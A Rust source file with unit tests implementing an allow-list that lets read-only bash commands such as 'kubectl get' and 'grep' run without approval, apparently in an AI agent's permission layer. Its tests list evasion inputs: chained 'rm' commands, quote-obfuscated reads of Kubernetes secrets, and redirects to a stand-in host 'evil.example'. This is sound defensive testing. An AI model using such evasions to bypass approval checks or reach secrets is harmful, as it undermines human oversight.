//! Bash commands that run without asking where a rule would otherwise ask.

use serde::Deserialize;

use super::{begins_with, normalize, normalize_all};

/// Punctuation that a command approved without asking may contain, besides letters, digits
/// and whitespace. None of it lets the shell run or read anything but what the words spell;
/// every other character asks, such as quotes and `\` (which hide words from these checks),
/// `$` (expansion), `*`, `?` and `[` (file names), `{` (brace expansion), parentheses, `#`,
/// and `;`, `&`, `` ` ``, `>`, `<` (chaining and redirection).
const PLAIN_PUNCTUATION: &[char] = &['-', '_', '.', '/', ':', '=', ',', '@', '+', '|', '^', '~', '!'];

/// The options that the commands of one program may pass and still run without asking, such
/// as the read-only options of kubectl. Which options of a program only choose what to read
/// is knowledge about that program, so it comes from configuration, not from this crate.
#[derive(Clone, Debug, Default, PartialEq, Eq, Deserialize)]
#[serde(default, deny_unknown_fields, rename_all = "camelCase")]
pub struct ProgramOptions {
    /// Long options without the leading `--`, such as `namespace`; `--namespace=prod` counts
    /// as `namespace`.
    pub long: Vec<String>,
    /// Single-letter options that take a value, given next or attached (`-oyaml`).
    pub short_with_value: Vec<char>,
    /// Single-letter options without a value; each must stand alone (`-A`, not `-Ap`).
    pub short_flags: Vec<char>,
}

impl ProgramOptions {
    /// Whether `option`, a word starting with `-`, is one of these. Options keep their case:
    /// a program's `-A` and `-a` can differ.
    fn allows(&self, option: &str) -> bool {
        if let Some(long) = option.strip_prefix("--") {
            let name = long.split_once('=').map_or(long, |(name, _)| name);
            return self.long.iter().any(|allowed| allowed == name);
        }
        let mut letters = option.chars().skip(1);
        match letters.next() {
            Some(flag) if self.short_flags.contains(&flag) => letters.next().is_none(),
            Some(flag) => self.short_with_value.contains(&flag),
            None => false,
        }
    }
}

/// Bash commands that run without asking where a rule would otherwise ask for approval.
///
/// A command is covered only when all of these hold:
/// - it is a `|` pipeline whose every segment starts with a listed prefix, compared with
///   whitespace collapsed and lowercased;
/// - it consists of letters, digits, whitespace and the punctuation `- _ . / : = , @ + | ^ ~ !`,
///   so no quoting, escaping, expansion or other shell syntax can change what runs;
/// - it contains no URL (`://`) and none of the [`except`](Self::except) texts;
/// - a segment that runs a program given [`options`](Self::options) passes only those options.
///
/// The check is lexical: it decides only whether to ask, and never turns a denial into an
/// approval. It knows no particular program: which of a program's options are safe to pass
/// without asking is configuration.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct AutoApprove {
    prefixes: Vec<String>,
    /// Normalized texts that keep a command asking.
    except: Vec<String>,
    /// Lowercased program names and the options their segments may pass.
    options: Vec<(String, ProgramOptions)>,
}

impl AutoApprove {
    /// Commands starting with one of `prefixes`, such as `grep`. An empty list covers no
    /// command.
    pub fn new(prefixes: impl IntoIterator<Item = impl AsRef<str>>) -> Self {
        Self {
            prefixes: normalize_all(prefixes),
            except: Vec::new(),
            options: Vec::new(),
        }
    }

    /// Texts that keep a command asking wherever they appear in it, compared like the
    /// prefixes, such as `secret` (which also matches `secrets`).
    pub fn except(mut self, texts: impl IntoIterator<Item = impl AsRef<str>>) -> Self {
        self.except.extend(normalize_all(texts));
        self
    }

    /// Limit the segments that run `program`, their first word compared without case, to
    /// `options`: any other option asks. Segments of programs given no options may pass any.
    /// A second call for the same program replaces the first.
    pub fn options(mut self, program: &str, options: ProgramOptions) -> Self {
        let program = normalize(program);
        self.options.retain(|(name, _)| *name != program);
        self.options.push((program, options));
        self
    }

    /// Whether `command` may run without asking.
    pub fn covers(&self, command: &str) -> bool {
        let plain = command
            .chars()
            .all(|c| c.is_alphanumeric() || c == ' ' || c == '\t' || PLAIN_PUNCTUATION.contains(&c));
        if self.prefixes.is_empty() || !plain {
            return false;
        }
        let normalized = normalize(command);
        if normalized.contains("://") || self.except.iter().any(|text| normalized.contains(text.as_str())) {
            return false;
        }
        // Without quotes in the command, every `|` separates two segments.
        command.split('|').all(|raw| {
            let segment = normalize(raw);
            self.prefixes.iter().any(|prefix| begins_with(&segment, prefix))
                && self.passes_listed_options(&segment, raw)
        })
    }

    /// Whether a pipeline segment passes only the options its program may pass. `segment` is
    /// normalized; the options are read from `raw`, which keeps their case.
    fn passes_listed_options(&self, segment: &str, raw: &str) -> bool {
        let Some(program) = segment.split(' ').next() else {
            return true;
        };
        let Some((_, options)) = self.options.iter().find(|(name, _)| name == program) else {
            return true;
        };
        raw.split_whitespace()
            .skip(1)
            .filter(|word| word.starts_with('-'))
            .all(|option| options.allows(option))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auto_approval_covers_listed_read_only_pipelines() {
        let list = AutoApprove::new(["kubectl get", "grep", "jq"]);
        for command in [
            "kubectl get pods -A | grep -v Running",
            "KUBECTL  get\tpods -n prod",
            "kubectl get pods -o json | jq -s .",
            "grep -s error app.log",
        ] {
            assert!(list.covers(command), "{command}");
        }
    }

    #[test]
    fn auto_approval_asks_for_commands_beyond_the_list() {
        let list = AutoApprove::new(["kubectl get", "grep"]);
        for command in [
            "kubectl delete pod x",
            "kubectl get pods | kubectl delete pod x",
            "grepx error",
            "grep a || grep b",
            "kubectl get pods; rm x",
            "kubectl get pods && rm x",
            "grep x $(cat list)",
            "grep x app.log > copy",
            "grep a\nrm b",
        ] {
            assert!(!list.covers(command), "{command}");
        }
        assert!(!AutoApprove::default().covers("grep x"));
    }

    /// Read-only kubectl options, as a deployment's agent lists them; this crate knows none.
    fn kubectl_read_only() -> ProgramOptions {
        ProgramOptions {
            long: [
                "namespace",
                "context",
                "all-namespaces",
                "output",
                "selector",
                "field-selector",
                "sort-by",
                "container",
                "previous",
                "since",
                "tail",
            ]
            .map(String::from)
            .to_vec(),
            short_with_value: vec!['n', 'o', 'l', 'c'],
            short_flags: vec!['A', 'p'],
        }
    }

    fn kubectl_list(prefixes: &[&str]) -> AutoApprove {
        AutoApprove::new(prefixes)
            .except(["secret"])
            .options("kubectl", kubectl_read_only())
    }

    #[test]
    fn auto_approval_asks_for_urls_listed_texts_and_unlisted_options() {
        let list = kubectl_list(&["kubectl get", "grep"]);
        for command in [
            "kubectl get secret db -o yaml",
            "kubectl get SECRETS -A",
            "kubectl get -f https://example.com/pods.yaml",
            "grep -r token https://example.com",
            "kubectl get pods --server=https://example.com",
            "kubectl get pods --server example.com:443",
            "kubectl get pods -s example.com:443",
            "kubectl get pods -sexample.com:443",
            "kubectl get pods -As example.com:443",
            "kubectl get pods --kubeconfig /tmp/other",
            "kubectl get pods --token abc",
            "kubectl get pods --insecure-skip-tls-verify",
        ] {
            assert!(!list.covers(command), "{command}");
        }
    }

    #[test]
    fn a_program_given_no_options_passes_any_option() {
        // kubectl's options limit kubectl only.
        assert!(kubectl_list(&["kubectl get", "grep"]).covers("grep --server x app.log"));
        assert!(AutoApprove::new(["kubectl get"]).covers("kubectl get pods --raw /api"));
        assert!(!kubectl_list(&["kubectl get"]).covers("kubectl get pods --raw /api"));
    }

    #[test]
    fn options_given_again_for_a_program_replace_the_earlier_ones() {
        let list = kubectl_list(&["kubectl get"]).options(
            "KUBECTL",
            ProgramOptions {
                long: vec!["raw".into()],
                ..ProgramOptions::default()
            },
        );
        assert!(list.covers("kubectl get --raw /api"));
        assert!(!list.covers("kubectl get pods -n prod"));
    }

    #[test]
    fn auto_approval_asks_when_quoting_or_expansion_could_change_a_word() {
        let list = AutoApprove::new(["kubectl get", "grep"]);
        for command in [
            "kubectl get sec\"\"rets -A -o yaml",
            "kubectl get sec''rets -A -o yaml",
            "kubectl get sec\\rets -A -o yaml",
            "kubectl get sec${X}rets -A -o yaml",
            "kubectl get s?crets -A",
            "kubectl get s[e]crets -A",
            "kubectl get sec{r,}ets -A",
            "kubectl get pods \"--server=evil.example:443\"",
            "kubectl get pods --ser''ver=evil.example:443",
            "kubectl get pods \"-s\" evil.example:443",
            "kubectl get --raw \"https:\"//evil.example/x",
            "grep error app.log # note",
        ] {
            assert!(!list.covers(command), "{command}");
        }
    }

    #[test]
    fn auto_approval_asks_for_options_the_program_does_not_list() {
        let list = kubectl_list(&["kubectl get", "kubectl version", "kubectl logs"]);
        for command in [
            "kubectl version --client --profile=heap --profile-output=/home/u/.bashrc",
            "kubectl get pods --cache-dir=/home/u/.kube",
            "kubectl get --raw /api/v1/namespaces/default/pods",
            "kubectl get pods --context remote --user other-admin",
            "kubectl get pods --cluster other",
            "kubectl get pods --as=system:admin",
            "kubectl get pods -v=9",
            "kubectl get -f pods.yaml",
            "kubectl get pods -w",
            "kubectl get pods -Ap",
            "kubectl logs web --insecure-skip-tls-verify-backend",
        ] {
            assert!(!list.covers(command), "{command}");
        }
    }

    #[test]
    fn auto_approval_covers_options_the_program_lists() {
        let list = kubectl_list(&["kubectl get", "kubectl logs", "kubectl top", "grep"]);
        for command in [
            "kubectl get pods -n kube-system -o wide",
            "kubectl get pods -nkube-system -oyaml",
            "kubectl get pods --namespace=prod --context=remote --sort-by=.metadata.name",
            "kubectl get pods -A -l app=web,tier=api --field-selector=status.phase!=Running",
            "kubectl logs web-1 -c app --previous --tail=200 --since=1h",
            "kubectl top pods -A --sort-by=cpu",
            "grep -i ^error ~/logs/app.log",
        ] {
            assert!(list.covers(command), "{command}");
        }
    }
}
